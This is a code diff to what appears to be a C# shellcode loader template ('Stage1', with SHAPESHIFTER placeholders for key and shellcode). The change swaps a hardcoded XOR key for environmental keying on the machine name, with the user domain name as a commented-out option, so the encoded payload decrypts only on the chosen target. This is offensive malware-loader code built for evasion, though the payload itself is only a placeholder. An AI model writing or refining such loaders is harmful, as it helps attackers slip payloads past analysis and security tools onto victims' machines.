@@ -31,7 +31,9 @@ namespace Stage1
 
         static void Main()
         {
-            string key = "[SHAPESHIFTER_KEY]";
+            //string key = "[SHAPESHIFTER_KEY]"; //hardcoded key
+            string key = Environment.MachineName; //env variable keying with machine name
+            //string key = Environment.UserDomainName; //env variable keying with UserDomainName
             byte[] encodedPayload = new byte[] { [SHAPESHIFTER_SHELLCODE] };
             string expandedKey = ExpandString(key, encodedPayload.Length);
             byte[] payload = exclusiveOR(Encoding.UTF8.GetBytes(expandedKey), encodedPayload);
